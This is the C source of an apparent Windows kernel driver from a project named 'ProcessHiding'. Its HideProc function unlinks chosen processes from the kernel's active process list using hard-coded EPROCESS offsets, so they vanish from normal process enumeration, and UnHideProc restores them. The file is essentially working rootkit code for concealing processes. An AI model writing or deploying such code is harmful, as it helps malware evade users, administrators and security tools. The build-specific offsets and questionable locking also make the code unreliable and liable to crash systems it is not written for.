#include <ntifs.h>
#include <ntddk.h>
#include "..\ProcessHiding\Globals.h"


void Globals_Init(Globals* g_state) {
	ExInitializeResourceLite(&g_state->Lock);
	g_state->PidsCount = 0; 
	RtlZeroMemory(g_state->Pids, sizeof(g_state->Pids));
}

ULONG Globals_AddProcesses(_In_ Globals* g_state,_In_ const ULONG* pids,_In_ ULONG count) {
	ULONG added = 0; 
	ULONG current = 0; 
	NTSTATUS status; 
	BOOLEAN acquired = ExAcquireResourceExclusiveLite(&g_state->Lock, TRUE);
	if (acquired) {
		for (ULONG i = 0; i < MAX_PIDS && added < count; i++) {
			if (g_state->Pids[i] == 0) {
				
				ULONG_PTR ListEntry = 0; 
				status = HideProc(pids[current], &ListEntry);//modify the kernel object to make it invisible
				if (status == STATUS_SUCCESS) {
					g_state->Pids[i] = pids[current++]; // adding process pids in the globals state
					g_state->ListEntry[i] = ListEntry; 
					added++;
				}
			}
		}

		ExReleaseResourceLite(&g_state->Lock);

	}

	g_state->PidsCount += added; 
	return added; 

}

ULONG Globals_RemoveProcesses(Globals* g_state, const ULONG* pids, ULONG count) {
	ULONG removed = 0; 
	BOOLEAN acquired = ExAcquireResourceExclusiveLite(&g_state->Lock, TRUE);
	NTSTATUS status; 
	if (acquired) {
		for (int i = 0; i < MAX_PIDS && removed < count; i++) {
			ULONG pid = g_state->Pids[i];
			if (pid) {
				for (ULONG c = 0; c < count; c++) {
					if (pid == pids[c]) {
						status = UnHideProc(g_state, i);
						if (NT_SUCCESS(status)) {
							g_state->Pids[i] = 0; //removing pid from the list 
							g_state->ListEntry[i] = 0;
							removed++;
							break;
						} 
					}
				}
			}
		}
		ExReleaseResourceLite(&g_state->Lock);
	}
	g_state->PidsCount -= removed; 
	
	return removed; 
}

int Globals_FindProcess(_In_ Globals* g_state,_In_ ULONG pid) {
	int status = -1; 
	BOOLEAN acquired = ExAcquireResourceSharedLite(&g_state->Lock, TRUE);
	if (acquired) {
		ULONG exist = 0;
		for (int i = 0; i < MAX_PIDS && exist < g_state->PidsCount; i++) {
			if (g_state->Pids[i] == pid) { // process found 
				status = i; 
				break; 
			}
			exist++;
		}
		ExReleaseResourceLite(&g_state->Lock);
	}
	return status; 
}

NTSTATUS HideProc(_In_ ULONG pid,_Out_ ULONG_PTR* ListEntry) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS; 
	ULONG activeProcLinkOffset = 0x1d8;
	ULONG ProcLockOffset = 0x1c8;

	// to change this function using KPCR structure
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	if(!NT_SUCCESS(status)){
		return status; 
	}

	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcLinkOffset);
	
	*ListEntry =(ULONG_PTR) processListEntry;
	
	PEX_PUSH_LOCK ProcLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + ProcLockOffset);
	
	PLIST_ENTRY prev = processListEntry->Blink;
	PLIST_ENTRY next = processListEntry->Flink;

	//Im changing fields in prev and next, so maybe I should take the lock of the EPROC structure
	EPROCESS* prevProcess = CONTAINING_RECORD(prev, EPROCESS, ActiveProcessLinks);
	EPROCESS* nextProcess = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);

	PEX_PUSH_LOCK prevLock = (PEX_PUSH_LOCK)((ULONG_PTR)prevProcess + ProcLockOffset);
	ExAcquirePushLockExclusiveEx(prevLock, 0);
	
	if (prev) {
		prev->Flink = next;
	}
	ExReleasePushLockExclusive(prevLock);

	PEX_PUSH_LOCK nextLock = (PEX_PUSH_LOCK)((ULONG_PTR)nextProcess + ProcLockOffset);
	ExAcquirePushLockExclusiveEx(nextLock, 0);

	if (next) {
		next->Blink = prev;
	}
	ExReleasePushLockExclusive(nextLock);


	ExAcquirePushLockExclusiveEx(ProcLock, 0);
	//to avoid BSOD
	processListEntry->Blink = (PLIST_ENTRY)&processListEntry->Flink;
	processListEntry->Flink = (PLIST_ENTRY)&processListEntry->Flink;

	ExReleasePushLockExclusive(ProcLock);
	ObDereferenceObject(targetProcess);
	return status; 
}

NTSTATUS UnHideProc(_In_ Globals* g_state, ULONG index) {
	PEPROCESS systemProcess; 
	NTSTATUS status = STATUS_SUCCESS;
	ULONG activeProcLinkOffset = 0x1d8;
	ULONG ProcLockOffset = 0x1c8;

	status = PsLookupProcessByProcessId(UlongToHandle(SYSTEM_PROCESS_PID), &systemProcess);
	if (!NT_SUCCESS(status)) {
		return status;
	}

	PLIST_ENTRY systemListEntry = (PLIST_ENTRY)((ULONG_PTR)systemProcess + activeProcLinkOffset);
	PEX_PUSH_LOCK SystemLock = (PEX_PUSH_LOCK)((ULONG_PTR)systemProcess + ProcLockOffset);
	
	PLIST_ENTRY next = systemListEntry->Flink;
	PLIST_ENTRY current = (PLIST_ENTRY)g_state->ListEntry[index];

	EPROCESS* currentProcess = CONTAINING_RECORD(current, EPROCESS, ActiveProcessLinks);
	EPROCESS* nextProcess = CONTAINING_RECORD(next, EPROCESS, ActiveProcessLinks);
	PEX_PUSH_LOCK currentLock = (PEX_PUSH_LOCK)((ULONG_PTR)currentProcess + ProcLockOffset);
	PEX_PUSH_LOCK nextLock = (PEX_PUSH_LOCK)((ULONG_PTR)nextProcess + ProcLockOffset);

	ExAcquirePushLockExclusiveEx(SystemLock, 0);	
	
	systemListEntry->Flink = current;

	ExReleasePushLockExclusive(SystemLock);
	
	ExAcquirePushLockExclusiveEx(currentLock, 0);
	current->Blink = systemListEntry;
	current->Flink = next;
	ExReleasePushLockExclusive(currentLock);

	ExAcquirePushLockExclusiveEx(nextLock, 0);

	next->Blink = current;

	ExReleasePushLockExclusive(nextLock);

	ObDereferenceObject(systemProcess);
	return status; 
}

void WriteHiddenProcessesInOutputBuffer(ULONG* outputBuffer, Globals* g_state) {
	ULONG hiddenProc = g_state->PidsCount;
	ULONG count = 0; 

	for (ULONG i = 0; i < MAX_PIDS && count < hiddenProc; i++) {
		if (g_state->Pids[i]) {
			//copy in output buffer the pid
			outputBuffer[count] = g_state->Pids[i];
			count++;
		}
	}
	return;
}

NTSTATUS CompleteRequest(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
	Irp->IoStatus.Status = status; 
	Irp->IoStatus.Information = info; 
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status; 
}